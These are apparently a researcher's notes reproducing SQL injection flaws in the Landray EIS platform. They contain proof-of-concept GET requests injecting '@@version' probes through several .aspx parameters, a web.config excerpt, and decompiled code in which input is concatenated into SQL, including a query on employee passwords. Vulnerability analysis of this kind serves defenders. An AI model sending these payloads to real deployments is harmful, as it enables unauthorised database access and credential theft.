## 蓝凌EIS智慧协同平台

```
蓝凌EIS智慧协同平台doc_fileedit_word.aspx存在SQL注入漏洞
GET /dossier/doc_fileedit_word.aspx?recordid=1'%20and%201=@@version--+&edittype=1,1 HTTP/1.1
Host: your_ip
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Connection: close
GET /SM/rpt_listreport_definefield.aspx?ID=2%20and%201=@@version--+ HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 11.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
GET /frm/frm_form_list_main.aspx?list_id=1%20and%201=@@version--+ HTTP/1.1
Host:your_ip
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Connection: close
```

Web.config部分如下

```
    <system.web>
    <httpHandlers>
      <remove verb="*" path="*.asmx" />
      <add verb="*" path="*.asmx" validate="false" type="System.Web.Script.Services.ScriptHandlerFactory, System.Web.Extensions, Version=3.5.0.0, Culture=neutral, PublicKeyToken=31BF3856AD364E35" />
      <add verb="*" path="*_AppService.axd" validate="false" type="System.Web.Script.Services.ScriptHandlerFactory, System.Web.Extensions, Version=3.5.0.0, Culture=neutral, PublicKeyToken=31BF3856AD364E35" />
      <add verb="GET,HEAD" path="ScriptResource.axd" validate="false" type="System.Web.Handlers.ScriptResourceHandler, System.Web.Extensions, Version=3.5.0.0, Culture=neutral, PublicKeyToken=31BF3856AD364E35" />
      <add verb="*" path="*.ashx" type="AjaxPro.AjaxHandlerFactory,AjaxPro.2" />
    </httpHandlers>
    <customErrors mode="Off" />
    <httpRuntime maxRequestLength="2097151" />
    <authentication mode="Forms">
      <forms loginUrl="/login.aspx" />
    </authentication>
    <identity impersonate="false" />
    <authorization>
      <deny users="?" />
    </authorization>
    <httpModules>
      <clear />
      <add name="OutputCache" type="System.Web.Caching.OutputCacheModule" />
      <add name="FormsAuthentication" type="System.Web.Security.FormsAuthenticationModule" />
      <add name="UrlAuthorization" type="System.Web.Security.UrlAuthorizationModule" />
      <add name="WindowsAuthentication" type="System.Web.Security.WindowsAuthenticationModule" />
      <add name="RoleManager" type="System.Web.Security.RoleManagerModule" />
      <add name="ScriptModule" type="System.Web.Handlers.ScriptModule, System.Web.Extensions, Version=3.5.0.0, Culture=neutral, PublicKeyToken=31BF3856AD364E35" />
      <add name="Session" type="System.Web.SessionState.SessionStateModule" />
    </httpModules>
    <globalization fileEncoding="utf-8" />
    <compilation batch="false" debug="false">
      <assemblies>
        <add assembly="System.Core, Version=3.5.0.0, Culture=neutral, PublicKeyToken=B77A5C561934E089" />
        <add assembly="System.Web.Extensions, Version=3.5.0.0, Culture=neutral, PublicKeyToken=31BF3856AD364E35" />
        <add assembly="System.Xml.Linq, Version=3.5.0.0, Culture=neutral, PublicKeyToken=B77A5C561934E089" />
        <add assembly="System.Data.DataSetExtensions, Version=3.5.0.0, Culture=neutral, PublicKeyToken=B77A5C561934E089" />
      </assemblies>
    </compilation>
    <pages enableSessionState="true" enableViewState="true" enableViewStateMac="true" validateRequest="false" asyncTimeout="7" enableEventValidation="false">
      <namespaces>
        <remove namespace="System.Web.UI.WebControls.WebParts" />
      </namespaces>
      <controls>
        <add tagPrefix="asp" namespace="System.Web.UI" assembly="System.Web.Extensions, Version=3.5.0.0, Culture=neutral, PublicKeyToken=31BF3856AD364E35" />
        <add tagPrefix="asp" namespace="System.Web.UI.WebControls" assembly="System.Web.Extensions, Version=3.5.0.0, Culture=neutral, PublicKeyToken=31BF3856AD364E35" />
        <add tagPrefix="ficontrols" namespace="LEOA.Core.Controls" assembly="Landray.Controls" />
      </controls>
  <dataConfiguration defaultDatabase="EIS" />
  <castle>
    <include uri="file://common_facilities.config" />
    <include uri="file://common_daos.config" />
    <include uri="file://common_services.config" />
  </castle>
  <location path="App_Themes">
    <system.web>
      <authorization>
        <allow users="*" />
      </authorization>
    </system.web>
  </location>
  <location path="Scripts">
    <system.web>
      <authorization>
        <allow users="*" />
      </authorization>
    </system.web>
  </location>
  <location path="JSResource">
    <system.web>
      <authorization>
        <allow users="*" />
      </authorization>
    </system.web>
  </location>
  <location path="CAB">
    <system.web>
      <authorization>
        <allow users="*" />
      </authorization>
    </system.web>
  </location>
  <location path="WS">
    <system.web>
      <authorization>
        <allow users="*" />
      </authorization>
    </system.web>
  </location>
  <location path="Global/KK">
    <system.web>
      <authorization>
        <allow users="*" />
      </authorization>
    </system.web>
  </location>
  <location path="Global/Pages/CheckPage">
    <system.web>
      <authorization>
        <allow users="*" />
      </authorization>
    </system.web>
  </location>
  <location path="third">
    <system.web>
      <authorization>
        <allow users="*" />
      </authorization>
    </system.web>
  </location>
  <location path="EIS">
    <system.web>
      <authorization>
        <allow users="*" />
      </authorization>
    </system.web>
  </location>
  <location path="Services/MobileDown.aspx">
    <system.web>
      <authorization>
        <allow users="*" />
      </authorization>
    </system.web>
  </location>
  <location path="favicon.ico">
    <system.web>
      <authorization>
        <allow users="*" />
      </authorization>
    </system.web>
  </location>
```





UniformEntry sql注入复现分析 网上poc如下

```
GET /third/DingTalk/Pages/UniformEntry.aspx?moduleid=1%20and%201=@@version--+ HTTP/1.1
Host: your-ip
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Accept-Encoding: gzip
```

打开文件Inherits="Landray.UI.DingTalk.UniformEntry"

但是我在Landray.UI一直没找到我佛 后来发现在Landray.UI.Integration.dll下

代码如下

```
		string text = ((Page)this).get_Request().get_Params()["moduleid"];
		if (string.IsNullOrEmpty(text))
		{
			return;
		}
		DataRow dataRow = DataAccess.GetDataRow("SELECT menuid,realurl FROM mekp_MobileDingTalkMenu(NOLOCK) WHERE ModuleId=" + text);
```



ShowUserInfo sql注入复现分析 网上poc如下

```
GET /third/DingTalk/Demo/ShowUserInfo.aspx?account=1'%20and%201=@@version--+ HTTP/1.1
Host: your_ip
Pragma: no-cache
Cache-Control: no-cache
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Connection: close
```

if语句判断text是否为空，不为空进入ShowInfo(isLogin: true, text);

```
			string text = ((((Page)this).get_Request().get_QueryString()["account"] == null) ? "" : ((Page)this).get_Request().get_QueryString()["account"]);
		if (!string.IsNullOrEmpty(text))
		{
			ShowInfo(isLogin: true, text);
		}
		else{
    ShowInfo(isLogin: false, text);
	private void ShowInfo(bool isLogin, string pAccount)
	{
		if (isLogin)
		{
			DataRow dataRow = DataAccess.GetDataRow("SELECT name,account,pwd FROM FI_ORG_EMP WHERE account='" + pAccount + "'");
	
```

